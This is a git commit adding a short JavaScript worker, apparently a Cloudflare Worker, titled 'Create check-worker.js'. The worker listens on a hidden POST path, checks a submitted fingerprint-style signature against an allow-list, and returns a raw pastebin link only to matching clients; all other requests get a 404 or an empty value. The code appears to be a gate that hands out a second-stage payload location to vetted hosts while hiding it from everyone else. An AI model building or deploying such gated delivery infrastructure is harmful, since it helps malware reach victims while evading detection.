9e05af77d43a3293b2d97a13b8d54cbdf3edce94
HXznxinhanba10fa9v-coDekxz <janxinhanbafav@gmail.com>
2026-02-22 05:36:06 +0700

    Create check-worker.js

---
+++ check-worker.js
@@ -0,0 +1,31 @@
+const VALID_SIGNATURES = [VALID_SIGNATURE];
+
+addEventListener("fetch", event => {
+    event.respondWith(handleRequest(event.request))
+})
+
+async function handleRequest(request) {
+    const url = new URL(request.url)
+
+    if (url.pathname !== "/confziwr" || request.method !== "POST") {
+        return new Response("Not Found", { status: 404 })
+    }
+
+    try {
+        const data = await request.json()
+        let signature = data.signature
+        if (!signature) return Response.json({ repo: "" })
+
+        signature = signature.replace(/:/g, "").toUpperCase()
+
+        if (VALID_SIGNATURES.includes(signature)) {
+            return Response.json({
+                repo: "https://pastebin.com/raw/J9TtFFDX"
+            })
+        } else {
+            return Response.json({ repo: "" })
+        }
+    } catch (e) {
+        return Response.json({ repo: "" })
+    }
+}
